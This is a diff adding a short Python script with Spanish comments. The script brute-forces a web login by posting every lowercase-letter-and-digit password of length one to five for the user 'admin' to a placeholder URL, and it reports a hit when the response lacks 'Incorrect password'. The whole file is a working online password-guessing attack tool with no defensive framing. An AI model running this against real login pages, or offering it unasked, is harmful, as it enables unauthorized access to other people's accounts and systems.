@@ -1,0 +1,33 @@
+import itertools
+import string
+import requests
+
+# URL del login
+URL_LOGIN = "(ingresar url)"
+
+# Usuario objetivo 
+usuario_objetivo = "admin"
+
+# Caracteres
+caracteres = string.ascii_lowercase + string.digits
+
+# Longitud mínima y máxima de la contraseña
+longitud_minima = 1
+longitud_maxima = 5  # Ajustar si no funciona
+
+# Intentar todas las combinaciones posibles de contraseñas
+for longitud in range(longitud_minima, longitud_maxima + 1):
+    for contrasena in itertools.product(caracteres, repeat=longitud):
+        contrasena = ''.join(contrasena)  # Convertir tuple → string
+
+        datos = {"username": usuario_objetivo, "password": contrasena}
+        respuesta = requests.post(URL_LOGIN, data=datos)
+
+        print(f"[*] Intentando: {contrasena}")
+
+        # Detectar un login exitoso
+        if "Incorrect password" not in respuesta.text and respuesta.status_code == 200:
+            print(f"[+] ¡Contraseña encontrada! Usuario: {usuario_objetivo} | Contraseña: {contrasena}")
+            exit()
+
+print("\n[✖] No se encontró la contraseña.")
